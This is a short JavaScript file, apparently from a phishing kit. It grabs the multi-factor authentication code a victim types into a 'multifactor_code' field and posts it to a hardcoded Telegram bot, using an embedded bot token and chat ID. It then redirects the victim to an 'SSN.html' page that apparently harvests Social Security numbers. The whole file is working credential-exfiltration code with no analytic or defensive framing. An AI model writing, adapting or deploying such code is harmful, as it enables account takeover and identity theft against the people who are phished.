//bot token

var telegram_bot_id = "6802693422:AAHswa3iATxJ2hAw76Rilwd8dC6f4WYqySM";
//chat id
var chat_id = 6156261130;
var otp_code, message;
var ready = function () {
    otp_code = document.getElementById("multifactor_code").value;
    message = "OTP: " + otp_code;
};
var sendercode = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        window.location.href = 'SSN.html';
    });
    document.getElementById("multifactor_code").value = "";
    return false;
};